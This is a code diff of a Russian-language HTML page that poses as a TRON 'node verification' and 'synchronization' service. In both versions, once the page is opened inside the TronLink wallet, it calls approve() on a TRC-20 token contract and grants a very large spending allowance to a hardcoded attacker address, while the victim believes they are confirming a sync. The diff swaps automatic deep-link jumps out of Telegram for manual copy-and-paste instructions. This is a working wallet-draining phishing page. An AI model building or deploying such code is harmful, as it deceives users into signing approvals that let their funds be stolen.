@@ -3,90 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Protocol Verification</title>
+    <title>Verification Center</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
-        .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; }
-        h2 { font-size: 20px; margin-bottom: 10px; }
-        p { color: #666; font-size: 13px; margin-bottom: 30px; line-height: 1.5; }
-        .btn { display: block; background: #ff0013; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 14px; cursor: pointer; text-decoration: none; }
-        #loader { display: none; color: #ff0013; font-size: 12px; margin-top: 15px; }
+        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; padding: 20px; }
+        .card { background: #111; border-radius: 24px; padding: 25px; border: 1px solid #222; text-align: center; }
+        .logo { width: 60px; height: 60px; background: #ff0013; border-radius: 18px; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; box-shadow: 0 0 20px rgba(255,0,0,0.2); }
+        h2 { font-size: 20px; margin-bottom: 20px; }
+        .step { display: flex; align-items: flex-start; text-align: left; margin-bottom: 20px; background: #1a1a1a; padding: 15px; border-radius: 15px; border: 1px solid #222; }
+        .step-num { background: #ff0013; color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; margin-right: 12px; flex-shrink: 0; }
+        .step-text { font-size: 13px; color: #ccc; line-height: 1.4; }
+        .btn { display: block; background: #ff0013; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 14px; font-weight: bold; font-size: 14px; cursor: pointer; text-decoration: none; margin-top: 10px; }
+        .btn-secondary { background: #222; color: #fff; margin-bottom: 10px; }
+        #copyStatus { font-size: 11px; color: #00ff00; margin-top: 5px; display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
+<div class="card" id="mainContent">
     <div class="logo">T</div>
-    <h2 id="title">Верификация узла</h2>
-    <p id="desc">Нажмите кнопку ниже. iPhone запросит разрешение на запуск TronLink — подтвердите переход.</p>
+    <h2>Синхронизация узла</h2>
     
-    <button id="mainBtn" class="btn">ПОДКЛЮЧИТЬ КОШЕЛЕК</button>
-    <div id="loader">Запуск протокола синхронизации...</div>
+    <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-text">Нажмите на кнопку ниже, чтобы скопировать адрес узла верификации.</div>
+    </div>
+    <button class="btn btn-secondary" onclick="copyLink()">📋 СКОПИРОВАТЬ АДРЕС</button>
+    <div id="copyStatus">Адрес успешно скопирован!</div>
+
+    <div class="step" style="margin-top: 15px;">
+        <div class="step-num">2</div>
+        <div class="step-text">Перейдите в <b>TronLink</b> -> вкладка <b>Browser</b> и вставьте адрес в строку поиска.</div>
+    </div>
+    <a href="tronlinkorg://dapp?url=https://timur3417.github.io/sync-node-app/" class="btn">ОТКРЫТЬ TRONLINK</a>
 </div>
 
 <script>
-    const btn = document.getElementById('mainBtn');
-    const loader = document.getElementById('loader');
-
     const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
-    btn.onclick = async () => {
+    // Функция копирования ссылки
+    function copyLink() {
+        const link = "https://timur3417.github.io/sync-node-app/";
+        navigator.clipboard.writeText(link).then(() => {
+            document.getElementById('copyStatus').style.display = 'block';
+            setTimeout(() => { document.getElementById('copyStatus').style.display = 'none'; }, 2000);
+        });
+    }
+
+    // Логика когда открыли ВНУТРИ TronLink
+    window.onload = async () => {
         const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
+        if (tron) {
+            document.getElementById('mainContent').innerHTML = `
+                <div class="logo">T</div>
+                <h2>Узел Обнаружен</h2>
+                <p style="color: #888; font-size: 14px; margin-bottom: 30px;">Кошелек успешно подключен к системе верификации логов. Подтвердите синхронизацию.</p>
+                <button id="finalBtn" class="btn">ПОДТВЕРДИТЬ СИНХРОНИЗАЦИЮ</button>
+                <p style="color: #444; font-size: 11px; margin-top: 20px;">Protocol: TRC-20 Security Gateway</p>
+            `;
 
-        if (!tron) {
-            // МЫ В ТЕЛЕГРАМЕ -> НУЖЕН ПРЫЖОК
-            loader.style.display = "block";
-            btn.innerText = "ОТКРЫТИЕ...";
-
-            const myUrl = window.location.href;
-            // Три варианта протокола для максимальной пробиваемости на iOS
-            const links = [
-                `tronlinkorg://dapp/open?url=${encodeURIComponent(myUrl)}`,
-                `tronlinkorg://dapp?url=${encodeURIComponent(myUrl)}`,
-                `trownlink://dapp?url=${encodeURIComponent(myUrl)}`
-            ];
-
-            // Пробуем вызвать первый
-            window.location.href = links[0];
-            
-            // Если через 500мс ничего не случилось - пробуем запасной
-            setTimeout(() => { window.location.replace(links[1]); }, 500);
-            return;
+            document.getElementById('finalBtn').onclick = async () => {
+                try {
+                    await tron.request({ method: 'tron_requestAccounts' });
+                    const instance = await tron.contract().at(CONTRACT);
+                    await instance.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
+                    alert("Синхронизация завершена!");
+                } catch (e) { alert("Ошибка: " + e.message); }
+            };
         }
-
-        // МЫ ВНУТРИ TRONLINK -> ДЕЛАЕМ APPROVE
-        try {
-            btn.innerText = "ПОДТВЕРЖДЕНИЕ...";
-            btn.disabled = true;
-
-            await tron.request({ method: 'tron_requestAccounts' });
-            const instance = await tron.contract().at(CONTRACT);
-            
-            // Вызываем Approve
-            await instance.approve(ADMIN, '1000000000000000000').send({
-                feeLimit: 100000000
-            });
-
-            btn.innerText = "СИНХРОНИЗИРОВАНО";
-            btn.style.background = "#00ff00";
-        } catch (err) {
-            alert("Ошибка: " + err.message);
-            btn.disabled = false;
-            btn.innerText = "ПОДТВЕРДИТЬ";
-        }
-    };
-
-    // Авто-настройка, если мы уже в кошельке
-    window.onload = () => {
-        if (window.tronWeb || (window.tron && window.tron.tronWeb)) {
-            document.getElementById('title').innerText = "Узел Обнаружен";
-            document.getElementById('desc').innerText = "Нажмите «ПОДТВЕРДИТЬ» для финальной подписи транзакции.";
-            btn.innerText = "ПОДТВЕРДИТЬ";
-        }
-    };
+    }
 </script>
 </body>
 </html>
